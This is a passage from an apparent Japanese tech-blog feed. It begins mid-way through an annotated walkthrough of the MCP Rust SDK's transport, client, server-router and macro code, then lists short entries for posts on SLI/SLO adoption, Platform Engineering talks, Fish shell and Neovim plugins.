TransportHandleという関連型を使うことで、トランスポートとそのハンドルを型レベルで紐づけています。これにより、異なるトランスポート実装が異なるハンドル型を持つことができます。非同期トレイト：#[async_trait]マクロを使って、非同期メソッドをトレイトに含められるようにしています。これは標準のRustでは直接サポートされていない機能です。分離された開始と通信：startメソッドで接続を確立し、その結果として得られるハンドルを使って通信するという2段階のパターンを採用しています。これにより、接続のライフサイクルとメッセージ送受信を明確に分離できます。このような抽象化により、新しいトランスポート実装を追加するのが容易になりますし、クライアント側のコードはトランスポートの詳細を気にせず書けるようになります。StdioTransportの実装標準入出力を使ったトランスポート実装も見てみましょう：pub struct StdioTransport {    command: String,    args: Vec<String>,    env: HashMap<String, String>,}impl StdioTransport {    pub fn new<S: Into<String>>(        command: S,        args: Vec<String>,        env: HashMap<String, String>,    ) -> Self {        Self {            command: command.into(),            args,            env,        }    }    async fn spawn_process(&self) -> Result<(Child, ChildStdin, ChildStdout, ChildStderr), Error> {        let mut command = Command::new(&self.command);        command            .envs(&self.env)            .args(&self.args)            .stdin(std::process::Stdio::piped())            .stdout(std::process::Stdio::piped())            .stderr(std::process::Stdio::piped())            .kill_on_drop(true);        // Set process group only on Unix systems        #[cfg(unix)]        command.process_group(0); // don\'t inherit signal handling from parent process        // Hide console window on Windows        #[cfg(windows)]        command.creation_flags(0x08000000); // CREATE_NO_WINDOW flag        let mut process = command            .spawn()            .map_err(|e| Error::StdioProcessError(e.to_string()))?;        let stdin = process            .stdin            .take()            .ok_or_else(|| Error::StdioProcessError(\\"Failed to get stdin\\".into()))?;        let stdout = process            .stdout            .take()            .ok_or_else(|| Error::StdioProcessError(\\"Failed to get stdout\\".into()))?;        let stderr = process            .stderr            .take()            .ok_or_else(|| Error::StdioProcessError(\\"Failed to get stderr\\".into()))?;        Ok((process, stdin, stdout, stderr))    }}この実装の素晴らしい点を見てみましょう：プラットフォーム固有の最適化：#[cfg(unix)]と#[cfg(windows)]を使って、各OSに最適な設定を行っています。これはRustの条件付きコンパイルの機能をうまく活用した例です。リソース管理：kill_on_drop(true)を使って、オブジェクトが破棄された時に子プロセスも確実に終了するよう保証しています。これはリソースリークを防ぐための重要な安全策です。エラーハンドリング：ok_or_elseのような関数を使って、エラーケースを明確に処理しています。これにより、どのような状況でもプログラムが予測可能な動作をするようになります。この実装は、複雑な子プロセス操作を安全かつ効率的に行うための優れた例です。特に、クロスプラットフォームな動作を保証するための配慮が随所に見られます。クライアント本体の実装最後に、クライアント本体の実装を見てみましょう：pub struct McpClient<S>where    S: Service<JsonRpcMessage, Response = JsonRpcMessage> + Clone + Send + Sync + \'static,    S::Error: Into<Error>,    S::Future: Send,{    service: Mutex<S>,    next_id: AtomicU64,    server_capabilities: Option<ServerCapabilities>,    server_info: Option<Implementation>,}impl<S> McpClient<S>where    S: Service<JsonRpcMessage, Response = JsonRpcMessage> + Clone + Send + Sync + \'static,    S::Error: Into<Error>,    S::Future: Send,{    pub fn new(service: S) -> Self {        Self {            service: Mutex::new(service),            next_id: AtomicU64::new(1),            server_capabilities: None,            server_info: None,        }    }    /// Send a JSON-RPC request and check we don\'t get an error response.    async fn send_request<R>(&self, method: &str, params: Value) -> Result<R, Error>    where        R: for<\'de> Deserialize<\'de>,    {        let mut service = self.service.lock().await;        service.ready().await.map_err(|_| Error::NotReady)?;        let id = self.next_id.fetch_add(1, Ordering::SeqCst);        let request = JsonRpcMessage::Request(JsonRpcRequest {            jsonrpc: \\"2.0\\".to_string(),            id: Some(id),            method: method.to_string(),            params: Some(params.clone()),        });        let response_msg = service            .call(request)            .await            .map_err(|e| Error::McpServerError {                server: self                    .server_info                    .as_ref()                    .map(|s| s.name.clone())                    .unwrap_or(\\"\\".to_string()),                method: method.to_string(),                // we don\'t need include params because it can be really large                source: Box::new(e.into()),            })?;        // ... レスポンス処理 ...    }}この実装には、Rustの現代的な非同期プログラミング技術が凝縮されています。Tower Serviceの活用：低レベルのトランスポート詳細を抽象化するために、Tower crateのServiceトレイトを使用しています。これはミドルウェアの組み合わせや機能拡張を容易にします。ジェネリックな戻り値型：send_request<R>のようなジェネリック関数を使って、様々な型のレスポンスを受け取れるようにしています。これはクライアントAPIを使いやすくする工夫です。スレッドセーフなカウンター：AtomicU64を使って、スレッドセーフなID生成を実現しています。これは並行処理を安全に行うための基本的なテクニックです。非同期排他制御：Mutex<S>を使って、非同期コンテキストでのサービスアクセスを管理しています。tokio::sync::Mutexはブロッキングせずに排他制御を行える優れたプリミティブです。これらの機能を組み合わせることで、堅牢で効率的、かつ使いやすいクライアントAPIを実現しています。特にTowerのサービス抽象化を活用することで、将来的な拡張性も確保されています。mcp-server: モジュラーなサーバー設計mcp-serverクレートは、MCPサーバーをRustで実装するためのフレームワークを提供しています。ここでもいくつか興味深い実装が見られます。ByteTransportの実装#[pin_project]pub struct ByteTransport<R, W> {    // Reader is a BufReader on the underlying stream (stdin or similar) buffering    // the underlying data across poll calls, we clear one line (\\\\n) during each    // iteration of poll_next from this buffer    #[pin]    reader: BufReader<R>,    #[pin]    writer: W,}impl<R, W> ByteTransport<R, W>where    R: AsyncRead,    W: AsyncWrite,{    pub fn new(reader: R, writer: W) -> Self {        Self {            // Default BufReader capacity is 8 * 1024, increase this to 2MB to the file size limit            // allows the buffer to have the capacity to read very large calls            reader: BufReader::with_capacity(2 * 1024 * 1024, reader),            writer,        }    }}impl<R, W> Stream for ByteTransport<R, W>where    R: AsyncRead + Unpin,    W: AsyncWrite + Unpin,{    type Item = Result<JsonRpcMessage, TransportError>;    fn poll_next(self: Pin<&mut Self>, cx: &mut Context<\'_>) -> Poll<Option<Self::Item>> {        // Poll実装...    }}この実装には、Rustの非同期I/Oに関する高度な知識が詰まっています。巨大なバッファサイズ：デフォルトの8KBではなく2MBという大きなバッファを使用し、大量のデータを効率的に処理できるようにしています。これは実際のユースケースに基づく現実的な最適化でしょう。pin-projectの活用：非同期処理でピン留めが必要なフィールドを持つ構造体を安全に扱うために、pin-projectクレートを使用しています。これは非同期Rustの複雑な問題を解決するための定石です。Streamトレイトの実装：Streamトレイトを実装することで、メッセージを非同期ストリームとして扱えるようにしています。これは非同期処理パターンとの自然な統合を可能にします。このようなトランスポート実装により、サーバーは効率的に大量のメッセージを処理できるようになります。また、バッファ管理や非同期I/Oの複雑さは抽象化されるため、上位層のコードはビジネスロジックに集中できます。優れたRouterトレイトMCPサーバーの中核となるのがRouterトレイトです。pub trait Router: Send + Sync + \'static {    fn name(&self) -> String;    fn instructions(&self) -> String;    fn capabilities(&self) -> ServerCapabilities;    fn list_tools(&self) -> Vec<mcp_core::tool::Tool>;    fn call_tool(        &self,        tool_name: &str,        arguments: Value,    ) -> Pin<Box<dyn Future<Output = Result<Vec<Content>, ToolError>> + Send + \'static>>;    fn list_resources(&self) -> Vec<mcp_core::resource::Resource>;    fn read_resource(        &self,        uri: &str,    ) -> Pin<Box<dyn Future<Output = Result<String, ResourceError>> + Send + \'static>>;    fn list_prompts(&self) -> Vec<Prompt>;    fn get_prompt(&self, prompt_name: &str) -> PromptFuture;    // 以下はデフォルト実装を持つヘルパーメソッド    fn create_response(&self, id: Option<u64>) -> JsonRpcResponse { ... }    fn handle_initialize(&self, req: JsonRpcRequest) -> impl Future<Output = Result<JsonRpcResponse, RouterError>> + Send { ... }    // その他のハンドラメソッド...}この設計の素晴らしさは以下の点にあります。最小限の実装要件：ユーザーが実装すべきメソッドは基本的な機能に限られており、複雑なプロトコル処理はデフォルト実装として提供されています。これにより、ルーターの実装がシンプルになり、ドメインロジックに集中できます。Futureを返すメソッド：ツール呼び出しなどの処理は非同期で行われるケースが多いため、Pin<Box<dyn Future<...>>>を返すメソッドになっています。これにより、実装者は任意の非同期処理を行う自由を持ちます。明確なトレイト境界：Send + Sync + \'staticという境界により、マルチスレッド環境での使用を安全に行えるようになっています。これは実際のサーバー環境では不可欠な制約です。この設計は、「使いやすさ」と「柔軟性」のバランスがとれた素晴らしい例です。初心者でも簡単に基本的なルーターを実装できますが、高度なユースケースに対応する拡張性も備えています。RouterServiceの実装pub struct RouterService<T>(pub T);impl<T> Service<JsonRpcRequest> for RouterService<T>where    T: Router + Clone + Send + Sync + \'static,{    type Response = JsonRpcResponse;    type Error = BoxError;    type Future = Pin<Box<dyn Future<Output = Result<Self::Response, Self::Error>> + Send>>;    fn poll_ready(&mut self, _cx: &mut Context<\'_>) -> Poll<Result<(), Self::Error>> {        Poll::Ready(Ok(()))    }    fn call(&mut self, req: JsonRpcRequest) -> Self::Future {        let this = self.0.clone();        Box::pin(async move {            let result = match req.method.as_str() {                \\"initialize\\" => this.handle_initialize(req).await,                \\"tools/list\\" => this.handle_tools_list(req).await,                \\"tools/call\\" => this.handle_tools_call(req).await,                \\"resources/list\\" => this.handle_resources_list(req).await,                \\"resources/read\\" => this.handle_resources_read(req).await,                \\"prompts/list\\" => this.handle_prompts_list(req).await,                \\"prompts/get\\" => this.handle_prompts_get(req).await,                _ => {                    let mut response = this.create_response(req.id);                    response.error = Some(RouterError::MethodNotFound(req.method).into());                    Ok(response)                }            };            result.map_err(BoxError::from)        })    }}この実装は、デザインパターンの「アダプターパターン」を思わせる優れた例です。シンプルなラッパー型：RouterService<T>(pub T)というシンプルな新型でRouterトレイトをTowerのServiceトレイトに適応させています。これは非常にエレガントなアプローチです。メソッドディスパッチ：リクエストのmethod文字列に基づいて適切なハンドラメソッドに処理をディスパッチしています。これはルーティングのための直感的で効率的な実装です。Clone要件：非同期クロージャ内でルーターを使用するためにCloneトレイト境界を要求しています。これにより、所有権の問題を簡単に解決できます。このようなラッパー型とディスパッチロジックにより、開発者はRouterトレイトの実装に集中でき、ServiceやTowerのような低レベルの詳細を気にする必要がなくなります。これは抽象化の良い例です。mcp-macros: 宣言的ツール定義の魔法最後に、mcp-macrosクレートの中核である#[tool]マクロを見てみましょう：#[proc_macro_attribute]pub fn tool(args: TokenStream, input: TokenStream) -> TokenStream {    let args = parse_macro_input!(args as MacroArgs);    let input_fn = parse_macro_input!(input as ItemFn);    // Extract function details    let fn_name = &input_fn.sig.ident;    let fn_name_str = fn_name.to_string();    // Generate PascalCase struct name from the function name    let struct_name = format_ident!(\\"{}\\", { fn_name_str.to_case(Case::Pascal) });    // Use provided name or function name as default    let tool_name = args.name.unwrap_or(fn_name_str);    let tool_description = args.description.unwrap_or_default();    // パラメータの抽出処理...    // 実装の生成    let params_struct_name = format_ident!(\\"{}Parameters\\", struct_name);    let expanded = quote! {        #[derive(serde::Deserialize, schemars::JsonSchema)]        struct #params_struct_name {            #(#param_defs,)*        }        #input_fn        #[derive(Default)]        struct #struct_name;        #[async_trait::async_trait]        impl mcp_core::handler::ToolHandler for #struct_name {            fn name(&self) -> &\'static str {                #tool_name            }            fn description(&self) -> &\'static str {                #tool_description            }            fn schema(&self) -> serde_json::Value {                mcp_core::handler::generate_schema::<#params_struct_name>()                    .expect(\\"Failed to generate schema\\")            }            async fn call(&self, params: serde_json::Value) -> Result<serde_json::Value, mcp_core::handler::ToolError> {                let params: #params_struct_name = serde_json::from_value(params)                    .map_err(|e| mcp_core::handler::ToolError::InvalidParameters(e.to_string()))?;                // Extract parameters and call the function                let result = #fn_name(#(params.#param_names,)*).await                    .map_err(|e| mcp_core::handler::ToolError::ExecutionError(e.to_string()))?;                Ok(serde_json::to_value(result).expect(\\"should serialize\\"))            }        }    };    TokenStream::from(expanded)}このマクロは、Rustの宣言的プログラミングの可能性を示す素晴らしい例です。関数からのメタデータ抽出：関数の名前や引数リストを解析して、ツールの基本情報を自動的に取得します。パラメータ構造体の自動生成：関数の引数リストから自動的にパラメータ構造体を生成し、serdeとschemarsのデリバティブを適用してJSON対応にします。ツールハンドラの自動実装：抽出した情報を元に、ToolHandlerトレイトを自動的に実装します。これにより、開発者はツールのビジネスロジックだけに集中できます。このマクロを使うと、以下のように簡潔なコードでツールを定義できます。#[tool(    name = \\"calculator\\",    description = \\"Perform basic arithmetic operations\\",    params(        x = \\"First number in the calculation\\",        y = \\"Second number in the calculation\\",        operation = \\"The operation to perform (add, subtract, multiply, divide)\\"    ))]async fn calculator(x: i32, y: i32, operation: String) -> Result<i32, ToolError> {    match operation.as_str() {        \\"add\\" => Ok(x + y),        \\"subtract\\" => Ok(x - y),        \\"multiply\\" => Ok(x * y),        \\"divide\\" => {            if y == 0 {                Err(ToolError::ExecutionError(\\"Division by zero\\".into()))            } else {                Ok(x / y)            }        }        _ => Err(ToolError::InvalidParameters(format!(            \\"Unknown operation: {}\\",            operation        ))),    }}通常なら数十行のボイラープレートコードが必要なところを、このマクロによって数行のアノテーションだけで実現できています。これは開発者体験を大幅に向上させる素晴らしい例です。Webフレームワークとの統合MCPはしばしばWebアプリケーションと統合されます。そのための優れた実装例を見てみましょう：async fn sse_handler(State(app): State<App>) -> Sse<impl Stream<Item = Result<Event, io::Error>>> {    // it\'s 4KB    const BUFFER_SIZE: usize = 1 << 12;    let session = session_id();    tracing::debug!(%session, \\"sse connection\\");    let (c2s_read, c2s_write) = tokio::io::simplex(BUFFER_SIZE);    let (s2c_read, s2c_write) = tokio::io::simplex(BUFFER_SIZE);    app.txs        .write()        .await        .insert(session.clone(), Arc::new(Mutex::new(c2s_write)));    {        let session = session.clone();        tokio::spawn(async move {            let router = RouterService(counter::CounterRouter::new());            let server = Server::new(router);            let bytes_transport = ByteTransport::new(c2s_read, s2c_write);            let _result = server                .run(bytes_transport)                .await                .inspect_err(|e| tracing::error!(?e, \\"server run error\\"));            app.txs.write().await.remove(&session);        });    }    let stream = futures::stream::once(futures::future::ok(        Event::default()            .event(\\"endpoint\\")            .data(format!(\\"?sessionId={session}\\")),    ))    .chain(        FramedRead::new(s2c_read, common::jsonrpc_frame_codec::JsonRpcFrameCodec)            .map_err(|e| io::Error::new(io::ErrorKind::InvalidData, e))            .and_then(move |bytes| match std::str::from_utf8(&bytes) {                Ok(message) => futures::future::ok(Event::default().event(\\"message\\").data(message)),                Err(e) => futures::future::err(io::Error::new(io::ErrorKind::InvalidData, e)),            }),    );    Sse::new(stream)}この実装は、Webアプリケーションとバックエンドサービスを統合する優れた例です。単方向チャネルの活用：tokio::io::simplexを使って、クライアントからサーバーへの通信とサーバーからクライアントへの通信を分離しています。これは各方向の流れを独立して最適化できるようにします。バックグラウンドタスク：MCPサーバーをtokio::spawnを使ってバックグラウンドタスクとして実行しています。これによりWebハンドラーは応答を待つことなく、すぐにSSEストリームを返すことができます。SSEストリームの構築：futures::stream::onceと.chain()を組み合わせて、初期メッセージと継続的なメッセージストリームを連結しています。これはストリーミングAPIの標準的なパターンです。この実装パターンは、MCPサーバーをWebアプリケーションに統合する効果的な方法を示しています。特に注目すべきは、非同期処理とストリーミングを効果的に組み合わせている点です。SDKの設計思想分析このSDKの実装から、いくつかの重要な設計思想が読み取れます。堅牢性と型安全性への徹底したこだわりこのSDKは、Rustの型システムを徹底的に活用して堅牢性を確保しています。トレイト境界（Send + Sync + \'staticなど）の明示的な指定ジェネリックパラメータを使ったAPI設計Result型による包括的なエラーハンドリングasync/awaitとFutureの適切な組み合わせこれらの特徴は、SDKの開発者がRustの強みをよく理解し、それを活かそうとしていることを示しています。特に、コンパイル時に多くのエラーを捕捉できるように設計されており、実行時の予期せぬ動作を最小限に抑える工夫が随所に見られます。拡張性と将来性を考えた設計SDKは将来の拡張を見据えた柔軟な設計になっています。トランスポート層の抽象化サービス層の分離とミドルウェアのサポートプラグイン可能なツール定義このような設計により、MCPプロトコル自体が進化しても、SDKを大きく書き換えることなく対応できるでしょう。また、ユーザーが独自の機能を追加するための拡張ポイントが多く用意されています。開発者体験の重視SDKは、使いやすさにも重点を置いています。マクロによるボイラープレートコードの削減直感的なビルダースタイルAPI豊富なデフォルト実装これらの機能は、SDKを使う開発者の負担を軽減し、本質的なビジネスロジックに集中できるようにするための工夫です。特に#[tool]マクロは、開発者体験を大幅に向上させる優れた例です。パフォーマンスへの配慮実装には、パフォーマンスを考慮した数々の工夫が見られます。大きなバッファサイズ（2MB）の使用非同期I/Oの全面採用ロックの最小化と効率的な並行処理これらの最適化は、MCPが大量のデータや複雑なコンテキストを扱うAIユースケースを想定していることを示唆しています。優れた実装パターンのまとめこのSDKから学べる優れたRust実装パターンをまとめましょう。1. 関心の明確な分離SDKは複数のクレートに分かれており、各クレートが明確な責任を持っています。これは保守性と再利用性を高める優れた設計原則です。2. トランスポート抽象化異なる通信方法（Stdio、SSEなど）を統一的なインターフェースで扱うための抽象化は、拡張性と柔軟性の高いコードを書くための良い例です。3. Tower ServiceパターンTowerのサービス抽象化を活用して、ミドルウェアの組み合わせやサービス合成を容易にする設計は、現代的なRustサーバー実装のベストプラクティスです。4. プロシージャルマクロの効果的な活用ボイラープレートコードを削減し、宣言的なスタイルでコードを書けるようにするマクロの活用は、開発者体験を向上させる優れた方法です。5. 非同期プログラミングのベストプラクティスPin、Box<dyn Future>、async_traitなどを適切に組み合わせた非同期処理の実装は、Rustの非同期プログラミングの洗練されたパターンを示しています。おわりにMCP Rust SDKの内部実装を深掘りすることで、Rustの強力な型システムと非同期プログラミングモデルを最大限に活用した素晴らしい設計パターンを学ぶことができました。このSDKは、「型安全性」「拡張性」「使いやすさ」「パフォーマンス」のバランスが優れており、大規模なRustアプリケーションを設計する際の参考になります。特に、トランスポート抽象化、サービス指向設計、プロシージャルマクロの活用は、他のRustプロジェクトでも応用できる価値のある実践例です。MCPプロトコルの実装を検討している方はもちろん、Rustでの堅牢なライブラリ設計に興味がある方にとっても、このSDKのコードベースは探求する価値のある宝庫と言えるでしょう。次回のブログではサンプルを見ながら実際に色々動かしてみたいと思います。syu-m-5151.hatenablog.com","isoDate":"2025-03-27T03:16:02.000Z","dateMiliSeconds":1743045362000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Kubernetesで実現できるPlatform Engineering の現在地","link":"https://speakerdeck.com/nwiizo/kubernetesdeshi-xian-dekiruplatform-engineering-noxian-zai-di","contentSnippet":"本日、「Kubernetesで実践する Platform Engineering - FL#88」というイベントで「Kubernetesで実現できるPlatform Engineering の現在地」\uD83C\uDFB5\uD83E\uDDED というタイトルで登壇しました！\\r\\r\uD83D\uDD0D イベント詳細:\\r- イベント名: Kubernetesで実践する Platform Engineering - FL#88\\r- 公式URL: https://forkwell.connpass.com/event/348104/\\r\\r\uD83D\uDDE3️ 関連スライド\\r- インフラをつくるとはどういうことなのか、 あるいはPlatform Engineeringについて\\r- https://speakerdeck.com/nwiizo/inhurawotukurutohadouiukotonanoka-aruihaplatform-engineeringnituite\\r- Platform Engineeringは自由のめまい\\r- https://speakerdeck.com/nwiizo/platform-engineeringhazi-you-nomemai","isoDate":"2025-03-25T04:00:00.000Z","dateMiliSeconds":1742875200000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Neovimのファジーファインダーtelescope.nvimでよく使っているpicker集","link":"https://blog.atusy.net/2025/03/25/nvim-telescope-pickers/","contentSnippet":"Vim駅伝2025-03-24の記事です。1日遅れで申し訳ありません。さて、telescope.nvimは言わずと知れたファジーファインダーと呼ばれるものです。ファジーファインダーとは、ファイルなどの候補一覧から、検索などで欲しいものを絞りこみ、開くなり消すなり任意のアクションを実行するためのツールです。たしかそんなようなことをShougoさんがvim-jp ラジオの#7か#8で語ってたはず。良い話いっぱいなので、聞いてみてください。【Vimプラグイン作者・Shougoさん登場！】エンジニアの楽園 vim-jp ラジオ #7【Shougoさんが考えるプラグインのあるべき姿】エンジニアの楽園 vim-jp ラジオ #8vim-jpではまたファジーファインダーかと叫ばれるくらいには作者が多く、vim-jpにいらっしゃる方の作品だけでもShougo/ddu.vim、vim-fall/fall.vim、hrsh7th/nvim-deckなどがあります。それくらいには求めるところがユーザーによって変わるということでしょう。","isoDate":"2025-03-25T00:00:00.000Z","dateMiliSeconds":1742860800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"論文紹介 ”A Survey on Large Language Model based Autonomous Agents”","link":"https://speakerdeck.com/shukob/lun-wen-shao-jie-a-survey-on-large-language-model-based-autonomous-agents","contentSnippet":"https://genai-users.connpass.com/event/349197/\\r\\rこの論文は大規模言語モデル（LLM）を基盤とする自律型エージェントに関する包括的な調査論文です。この論文は、LLMベースの自律型エージェントの現状、構成要素、課題、そして将来の展望について詳細に解説しています。\\r\\r本論文を読むことで、AIエージェントの概要を体系的に知ることができます。","isoDate":"2025-03-24T04:00:00.000Z","dateMiliSeconds":1742788800000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"「SLI/SLO・ラプソディあるいは組織への適用の旅」というタイトルで登壇してきました。　#信頼性向上_findy","link":"https://syu-m-5151.hatenablog.com/entry/2025/03/21/204737","contentSnippet":"はじめにこんにちは、スリーシェイクのnwiizoです。2025年3月21日に開催されたFindyさん主催のイベントで登壇してきました。findy.connpass.comイベント概要このイベントは、SLI/SLOの導入と運用に焦点を当てたライトニングトーク形式のセッションでした。サービス品質を高めるためのSLI/SLOですが、組織内での運用がうまくいってないケースや導入タイミングに悩まれている方も多いのが現状です。本イベントではSLI/SLOについて向き合っていらっしゃる4名の皆様に、導入までの取り組みや運用上の課題とその解決策を共有していただきます。参加者にとって今後システムの信頼性向上に取り組んでいくための知識やヒントを得られるイベントになることを目指します。私を含めた4名のスピーカーによる多角的なアプローチで、SLI/SLOに関する実践的な知見が共有されました。とても良い会だったと思います。私の発表内容資料 speakerdeck.com\uD83D\uDC7B本日、「信頼性向上の第一歩！～SLI/SLO策定までの取り組みと運用事例～」というイベントで「SLI/SLO・ラプソディあるいは組織への適用の旅」というタイトルで登壇します。こちら、資料になります。https://t.co/XtbFX2EOSH#信頼性向上_findy— nwiizo (@nwiizo) 2025年3月21日   発表の背景と位置づけこのイベントの準備にあたり、他の登壇者の方々の過去の発表や知見を事前に確認し、全体として何が語られるのかを予想してみました。技術的な実装方法や指標設計については他の方々が深く掘り下げられると考え、あえて私は「個人や組織への適用」という補完的な視点に焦点を当てることにしました。技術的な側面は重要ですが、実際にSLI/SLOが組織に定着するかどうかは、エンジニアリング以外の部分に大きく依存します。そこで今回は「技術をどう実装するか」ではなく「個人や組織をどう変革するか」という視点からSLI/SLOの旅を語ることにしました。発表の核心：三つの壁私の発表ではSLI/SLO導入における「三つの壁」に焦点を当てました1. 既存の習慣や方法からの変更を伴う壁「変化への抵抗」は克服すべき障害ではなく、理解し対話すべき自然な反応です。特に以下の4つの抵抗パターンを理解することが重要です。惰性による抵抗：「今のやり方で問題ない」労力による抵抗：「新しい方法を学ぶコストが高い」感情による抵抗：「自分の立場が脅かされる」心理的反発：変化に対する本能的な抵抗これらの抵抗に対して「北風」（強制）ではなく「太陽」（共感と対話）のアプローチが効果的です。2. 多くのステークホルダーとの協力が不可欠という壁SLI/SLOは技術だけの問題ではなく、むしろ組織の問題です。表向きは「全員で信頼性を高めましょう」という掛け声のもとで始まりますが、裏では様々な力学が働いています。部門間の隠れた対立構造：エンジニアリングは信頼性を重視し、プロダクトは新機能を優先し、経営層はコスト効率を求める。この三すくみの構造がSLI/SLO導入の最大の障壁になります。「会議では言えない本音」の存在：公式の場では皆が納得したように見えても、実際には「またエンジニアの自己満足では？」「数値のために本質を見失っている」といった潜在的な不信感が残ります。非公式なネットワークの重要性：公式のプロセスや説明会より、信頼関係のある個人間の非公式な対話の方が効果的なことが多いです。ランチタイムや1on1の場で地道に信頼関係を築く必要があります。技術と事業の懸け橋となる人材の重要性：各部門の言語を話せるクロスファンクショナルな理解者（技術と事業の両方を理解できる人）が不可欠です。このような架け橋となる存在を味方につけることが成功への近道になります。結局のところ、最も有効な戦略は「自分の専門領域を超えて相手の文脈で語る」ことです。技術者は事業KPIの言葉で、事業側は技術的制約の言葉で対話する努力が必要です。これが「信頼性は会話である」という言葉の本当の意味なのです。3. 目に見える成果が出るまでに時間がかかるという壁SLI/SLOの導入は短期決戦ではなく長期的な取り組みです。導入初期は一時的な作業量増加と基盤構築が先行本当の価値は6-12ヶ月後から現れることが多い「完璧なSLO」より「継続的に改善されるSLO」が重要長期的取り組みのためには、小さな成功の積み重ねと組織的なコミットメントが欠かせません。実務上の重要なポイントは、初期段階で期待値を適切に設定することです。多くの組織では「すぐに効果が出る」という期待から、半年程度で「効果がない」と判断されることがあります。これを防ぐには、短期的な小さな成功（例：アラート削減による疲労軽減）と長期的な大きな成功（例：システム安定性向上によるビジネス成長）の両方を明確に提示しておくことが重要です。発表を終えて今回のイベントでは、他の登壇者の方々もそれぞれの視点から素晴らしい発表をされていました。BASEのtandenさんがアラート品質の改善について、シンプルフォームの守屋さんが開発組織全体でのSLI/SLO実装について、ユーザベースの安藤さんがSREとCTOの両視点からのSLI/SLO活用について語られました。私は意図的に「組織文化と変革マネジメント」という視点から補完的に話すことで、イベント全体として技術から組織まで幅広い視点でSLI/SLOについて学べる場になったのではないかと思います。特に印象的だったのは、どの発表も「数値や指標そのものより、それを活用して何を実現するか」という本質的な部分を大切にしていたことです。形式的なSLI/SLO導入ではなく、真に組織とサービスの価値を高めるための取り組みとして捉えられていたのが印象的でした。まとめSLI/SLOの導入は一朝一夕にはいきません。それは旅のように、ゴールや完璧を目指すのではなく、継続的な前進が大切です。今日から始められることとしては：- 小さく始めて徐々に拡大する- まずは一つのサービスから- 既存の課題から出発するそして成功のための心構えとして：- 完璧よりも継続を重視する- 技術も情熱もどちらも大切- 信頼性は会話/対話から生まれるSLI/SLOの導入は技術的チャレンジであると同時に組織的チャレンジです。小さな一歩から始めて、組織全体で信頼性文化を育んでいきましょう。なお、SLI/SLOの基本概念から実践的な導入方法までを体系的に学ぶには、以下の書籍を必ず一読していただきたいと思います。組織への適用を考える前に、まずはこの本で基礎をしっかり固めることをお勧めします。www.oreilly.co.jpこれらのポイントを心に留めながら、組織にSLI/SLOを適用する旅を続けていきましょう。おわりにまた、他の登壇者の皆さんの発表資料も大変参考になりましたので、ぜひご覧ください。BASEの@tac_tandenさんによる「SLI/SLOの設定を進めるその前に、アラート品質の改善に取り組んだ話」では、SLI/SLO導入の前段階としてのアラート品質向上について詳しく解説されています。SREピラミットの下には常にモニタリングがあり自分の経験からも何よりも重要だと思っています。 speakerdeck.comシンプルフォームの守屋邦昭さんによる「開発組織全体で意識するSLI/SLOを実装している話」では、組織全体でのSLI/SLO実装について具体的な事例が紹介されています。 speakerdeck.comユーザベースの安藤裕紀さんによる「SREとしてSLI/SLOをどう普及してきたか、CTOとしてSLI/SLOをどう活用しているか」では、SRE視点とCTO視点の両面からSLI/SLOの活用方法が解説されています。個人的には俯瞰度合いが好きです。www.docswell.com最後までお読みいただき、ありがとうございました！","isoDate":"2025-03-21T11:47:37.000Z","dateMiliSeconds":1742557657000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Fishの補完をコマンドラインの内容に応じて変える","link":"https://blog.atusy.net/2025/03/21/fish-completion-considering-tokens/","contentSnippet":"Fishで補完を定義するとき、コマンドに指定された引数によって補完候補を変えたいことがあります。たとえばメインコマンドの直後だったらサブコマンドを補完したい、--input-fileの後だったらファイル名を補完したいとかいうことありますよね。","isoDate":"2025-03-21T00:00:00.000Z","dateMiliSeconds":1742515200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"SLI/SLO・ラプソディあるいは組織への適用の旅","link":"https://speakerdeck.com/nwiizo/slorapusodeiaruihazu-zhi-henoshi-yong-nolu","contentSnippet":"こんにちは、花粉症が辛いです。登壇する時にくしゃみしないために朝から外出を自粛してます。15分なのにスライドが40枚あります。\\r\\r\\r本日、「信頼性向上の第一歩！～SLI/SLO策定までの取り組みと運用事例～」というイベントで「SLI/SLO・ラプソディあるいは組織への適用の旅」\uD83C\uDFB5\uD83E\uDDED というタイトルで登壇しました！\\r\\r\uD83D\uDD0D イベント詳細:\\r- イベント名: 信頼性向上の第一歩！～SLI/SLO策定までの取り組みと運用事例～\\r- 公式URL: https://findy.connpass.com/event/345990/\\r\\r\uD83D\uDCDA さらに！4日後の3月25日には翻訳した書籍に関する登壇する別イベントもあります！\uD83D\uDE32\\r「Kubernetesで実践する Platform Engineering - FL#88」\uD83D\uDC33⚙️\\r興味がある方はぜひ参加してください！\uD83D\uDC68‍\uD83D\uDCBB\uD83D\uDC69‍\uD83D\uDCBB\\r\uD83D\uDC49 https://forkwell.connpass.com/event/348104/\\r\\rお見逃しなく！\uD83D\uDDD3️✨","isoDate":"2025-03-20T04:00:00.000Z","dateMiliSeconds":1742443200000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Fishの関数で関数外の変数を利用する","link":"https://blog.atusy.net/2025/03/20/use-outer-scope-vars-in-fish/","contentSnippet":"2025-03-21時点で最新のFish 4.0.1のデフォルト挙動では、関数が外界のローカル変数を参照できません。ためしに、関数fの外で定義した変数のechoを試みてみると、何も表示されません。","isoDate":"2025-03-20T00:00:00.000Z","dateMiliSeconds":1742428800000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"生成AIといっしょ: 動作するきれいなコードを生成AIとつくる","link":"https://syu-m-5151.hatenablog.com/entry/2025/03/19/201025","contentSnippet":"※こちらは社内で発表したものを外部で登壇できるように修正したものです。はじめに2021年にGitHub Copilotが発表され、2022年に一般利用可能になって以来、生成AIはソフトウェア開発の世界に急速に浸透してきました。「動作するきれいなコード」はソフトウェア開発の理想とされてきましたが、生成AIの登場によってこの理想に到達する道筋が大きく変化しています。本記事では、テスト駆動開発の原典である『テスト駆動開発』の基本理念を踏まえ、生成AIとの協業によって「動作するきれいなコード」を実現する方法について考察します。「動作するきれいなコード」とは何かt-wada氏がSeleniumConf Tokyo 2019での基調講演で引用したように、テスト駆動開発のゴールは「動作するきれいなコード（Clean code that works）」です。Kent Beckによるテスト駆動開発の書籍の冒頭には、次のような一節があります。 speakerdeck.com「動作するきれいなコード」。Ron 